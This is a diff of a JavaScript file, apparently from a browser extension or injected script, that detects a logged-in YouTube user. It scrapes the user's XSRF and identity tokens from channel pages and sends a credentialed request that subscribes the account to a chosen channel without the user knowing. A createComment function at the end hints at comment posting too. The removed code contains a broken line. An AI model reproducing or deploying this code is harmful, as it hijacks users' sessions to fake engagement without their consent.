@@ -155,123 +155,69 @@ function start() {
 
 function subscribe_now_count(vars) {
   var xhr = new XMLHttpRequest();
-  xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds, true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds + "/about", true);
   xhr.onreadystatechange = function() {
     if (xhr.readyState == 4 && xhr.status == 200) {
-		var data = xhr.responseText;
-		vars.login = data.match('"LOGGED_IN":(.*?),')[1];
-		if (vars.login == "true" || vars.login == true) {
-			vars.youtube_client_version = data.split('"innertube_context_client_version":"')[1].split('",')[0];
-			vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('",')[0];
-			vars.page_cl = data.split('"PAGE_CL":')[1].split(',"')[0];
-			vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('",')[0];
-			vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('",')[0];
-			vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('",')[0];
-			vars.trackingParams = data.split('"deemphasize":true}]},"TrackingParams":"')[0].split('"')[0] vars.csn = data;
-
-			function randomRange(min, max) {
-				return (Math.random() * (max - min + 1)) + min
-			}
-			vars.timeout = randomRange(4000, 10000);
-			setTimeout(function wait() {
-				subscribe_client(vars);
-			}, vars.timeout);
-		}  
+      var data = xhr.responseText;
+      vars.login = data.match('"LOGGED_IN":(.*?),')[1];
+      if (vars.login == "true" || vars.login == true) {
+        if (data.indexOf('onResponseReceivedActions') == -1) {
+          subscribe_client(vars);
+        }
+      }
     }
   }
   xhr.send();
 }
 
-
 function subscribe_client(vars) {
-    var xhr = new XMLHttpRequest();
-    var params = {};
-    params["sej"] = JSON.stringify({
-        "clickTrackingParams": vars.trackingParams,
-        "commandMetadata": {
-            "webCommandMetadata": {
-                "url": "/service_ajax",
-                "sendPost": true
-            }
-        },
-        "subscribeEndpoint": {
-            "channelIds": [vars.channelIds]
-        }
-    });
-    params["csn"] = vars.csn;
-    params["session_token"] = vars.session_token;
-    xhr.open("POST", "https://www.youtube.com/service_ajax?name=subscribeEndpoint", true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.setRequestHeader("x-client-data", vars.trackingParams);
-    xhr.setRequestHeader("x-spf-previous", "https://www.youtube.com/");
-    xhr.setRequestHeader("x-spf-referer", "https://www.youtube.com/");
-    xhr.setRequestHeader("x-youtube-client-name", 1);
-    xhr.setRequestHeader("x-youtube-client-version", vars.youtube_client_version);
-    xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
-    xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
-    xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
-    xhr.setRequestHeader("x-youtube-utc-offset", 180);
-    xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4 && xhr.status == 200) {
-            var data = JSON.parse(xhr.responseText);
-            if (data.code == "SUCCESS") {
-            }
-        }
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds + "?disable_polymer=1", true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      var data = xhr.responseText;
+      vars.ei = data.split('ytcfg.set("EVENT_ID", "')[1].split('"')[0];
+      vars.ved = data.split('feature=channels4&amp;ved=')[1].split('"')[0];
+      vars.xsrf_token = data.split('\'XSRF_TOKEN\': "')[1].split('"')[0];
+      vars.youtube_client_version = data.split('innertube_context_client_version":"')[1].split('"')[0];
+      vars.youtube_identity_token = data.split('\'ID_TOKEN\', "')[1].split('"')[0];
+      vars.page_build_label = data.split('\'PAGE_BUILD_LABEL\': "')[1].split('"')[0];
+      vars.variants_checksum = data.split('\'VARIANTS_CHECKSUM\': "')[1].split('"')[0];
+      vars.page_cl = data.split('\'PAGE_CL\': ')[1].split(',')[0];
+      vars.page_cl = parseFloat(vars.page_cl);
+      subscribe(vars);
     }
-    xhr.send(deSerialize(params));
+  }
+  xhr.send();
 }
 
-
-// function subscribe_client(vars) {
-  // var xhr = new XMLHttpRequest();
-  // xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds + "?disable_polymer=1", true);
-  // xhr.onreadystatechange = function() {
-    // if (xhr.readyState == 4 && xhr.status == 200) {
-      // var data = xhr.responseText;
-      // vars.ei = data.split('ytcfg.set("EVENT_ID", "')[1].split('"')[0];
-      // vars.ved = data.split('feature=channels4&amp;ved=')[1].split('"')[0];
-      // vars.xsrf_token = data.split('\'XSRF_TOKEN\': "')[1].split('"')[0];
-      // vars.youtube_client_version = data.split('innertube_context_client_version":"')[1].split('"')[0];
-      // vars.youtube_identity_token = data.split('\'ID_TOKEN\', "')[1].split('"')[0];
-      // vars.page_build_label = data.split('\'PAGE_BUILD_LABEL\': "')[1].split('"')[0];
-      // vars.variants_checksum = data.split('\'VARIANTS_CHECKSUM\': "')[1].split('"')[0];
-      // vars.page_cl = data.split('\'PAGE_CL\': ')[1].split(',')[0];
-      // vars.page_cl = parseFloat(vars.page_cl);
-      // subscribe(vars);
-    // }
-  // }
-  // xhr.send();
-// }
-
-// function subscribe(vars) {
-  // var params = {};
-  // params["ei"] = vars.ei;
-  // params["feature"] = "channels4";
-  // params["ved"] = vars.ved;
-  // params["session_token"] = vars.xsrf_token;
-  // fetch("https://www.youtube.com/subscription_ajax?action_create_subscription_to_channel=1&c=" + vars.channelIds, {
-    // "credentials": "include",
-    // "headers": {
-      // "accept": "*/*",
-      // "content-type": "application/x-www-form-urlencoded",
-      // "x-youtube-client-name": 1,
-      // "x-youtube-client-version": vars.youtube_client_version,
-      // "x-youtube-identity-token": vars.youtube_identity_token,
-      // "x-youtube-page-cl": vars.page_cl,
-      // "x-youtube-page-label": vars.page_build_label,
-      // "x-youtube-utc-offset": 180,
-      // "x-youtube-variants-checksum": vars.variants_checksum
-    // },
-    // "referrer": "https://www.youtube.com/channel/" + vars.channelIds,
-    // "referrerPolicy": "origin-when-cross-origin",
-    // "body": deSerialize(params),
-    // "method": "POST",
-    // "mode": "cors"
-  // }).then(response => response.text()).then((text) => {
-  // });
-// }
+function subscribe(vars) {
+  var params = {};
+  params["ei"] = vars.ei;
+  params["feature"] = "channels4";
+  params["ved"] = vars.ved;
+  params["session_token"] = vars.xsrf_token;
+  fetch("https://www.youtube.com/subscription_ajax?action_create_subscription_to_channel=1&c=" + vars.channelIds, {
+    "credentials": "include",
+    "headers": {
+      "accept": "*/*",
+      "content-type": "application/x-www-form-urlencoded",
+      "x-youtube-client-name": 1,
+      "x-youtube-client-version": vars.youtube_client_version,
+      "x-youtube-identity-token": vars.youtube_identity_token,
+      "x-youtube-page-cl": vars.page_cl,
+      "x-youtube-page-label": vars.page_build_label,
+      "x-youtube-utc-offset": 180,
+      "x-youtube-variants-checksum": vars.variants_checksum
+    },
+    "referrer": "https://www.youtube.com/channel/" + vars.channelIds,
+    "referrerPolicy": "origin-when-cross-origin",
+    "body": deSerialize(params),
+    "method": "POST",
+    "mode": "cors"
+  }).then(response => response.text()).then((text) => {
+  });
+}
 
 function createComment(vars) {
   var xhr = new XMLHttpRequest();
